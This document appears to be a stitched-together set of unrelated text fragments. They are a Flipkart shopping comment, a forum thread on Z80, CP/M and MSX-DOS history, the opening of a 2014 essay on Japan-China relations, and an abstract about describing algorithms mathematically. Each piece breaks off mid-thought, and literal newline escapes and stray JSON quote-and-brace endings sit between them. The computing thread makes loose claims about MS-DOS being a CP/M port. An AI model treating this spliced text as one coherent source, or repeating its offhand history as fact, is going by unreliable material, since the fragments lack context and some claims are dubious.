Flipkart in India is about access, not just convenience. Even with large\nbookstores like Landmark, Crossword, etc. all over the city, not every book s\navailable all the time. Say I want to buy a Swiss army knife from a small city\n- Flipkart is where I go!\n\n2.) The \u20b9500 minimum order requirement is a bit of a pain. But Flipkart\nusually still works out cheaper. Firstly, not many things apart from books\nwould be available for less than 500. And books on Flipkart are massively\ndiscounted. I bought a book last week for \u20b9450, with a markup of \u20b9795.

After the 8080,\nIntel made the 8086, an enhanced 16-bit version.\n\nCP/M ran on, among other things, the Z80. When IBM made the PC, they wanted\nsomething like CP/M, so Microsoft took an 8086 port of CP/M and made it into\nMS-DOS. Then when Microsoft Japan came up with the MSX standard, Paul Allen\nported MS-DOS back to the Z80, to create MSX-DOS. Because it was ultimately\nderived from CP/M, and ran on the same chip, MSX-DOS could (at least\ntheoretically) run CP/M programs unmodified!\n\n~~~\nbane\nIt lasted for quite a while and founded an unbelievable number of huge gaming\nfranchises.\n\nThe last version of the systems, the MSX turboR ran an R800, a Z80 compatible\nsemi-16-bit CPU. This was required because the 16-bit successor from Zilog was\nthe Z8000 which _wasn 't_ Z80 compatible. There was also the Z80000, a 32-bit\nCPU, but I don't think that was Z80 compatible (but it was probably powerful\nenough to just emulate it at full-speed).\n\nIt's weird the confluence"}

A brief history of leaving\nChina, becoming the other, and turning Japanese.\n\nBY DAVID PILLING MARCH 17, 2014\n\nOn March 16, 1885, an editorial entitled \"Leaving Asia\" was published in the\nJapanese newspaper Jiji Shimpo. Now widely believed to have been written by\nYukichi Fukuzawa, the intellectual giant of the 19th-century modernization\nmovement that culminated in the Meiji Restoration, it argued that Japan could\nsimply not afford to be held back by \"feudalistic\" China and Korea, and should\ntherefore \"leave the ranks of Asian nations and cast our lot with the\ncivilized nations of the West.\"\n\nJapan's break with China, a country it subsequently invaded and humiliated, is\na story of sharp relevance today. Tensions between the two nations are\nextremely high. Chinese and Japanese ships and planes circle disputed islands\nin the East China Sea, with the ever-present danger of an accident or willful\nescalation. Leaders in both countries have started to compare the present with\n1914 and 1939, when the world stood on the brink of war.\n\nThe principal cause of animosity is Japan's invasion of China in the"}

The\ncolumn is a special issue and collaboration of the distributed computing\ncolumn and the education column. Enjoy!\n\nAbstract: The need to handle large programs and to produce efficient compiled\ncode adds complexity to programming languages and limits their expressiveness.\nAlgorithms are not programs, and they can be expressed in a simpler and more\nexpressive language. That language is the one used by almost every branch of\nscience and engineering to precisely describe and reason about the objects\nthey study: the language of mathematics. Math is useful for describing a more\ngeneral class of algorithms than are studied in algorithm courses."}
